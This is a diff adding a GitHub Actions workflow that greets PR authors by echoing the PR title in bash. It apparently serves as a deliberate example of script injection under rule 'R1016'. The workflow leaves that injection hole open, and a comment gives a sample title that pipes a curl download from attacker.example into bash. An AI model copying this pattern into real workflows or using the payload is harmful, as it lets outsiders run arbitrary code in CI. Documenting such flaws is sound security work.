@@ -1,0 +1,19 @@
+name: Greet PR author
+
+on:
+  pull_request_target:
+    types: [opened]
+
+permissions:
+  contents: read
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Saludar usando el título del PR
+        run: |
+          echo "Gracias por tu PR: ${{ github.event.pull_request.title }}"
+          # R1016: la expresión se sustituye como TEXTO antes de que bash la vea.
+          # Un título de PR como   "; curl -s https://attacker.example/x | bash #
+          # inyecta comandos arbitrarios en este script.
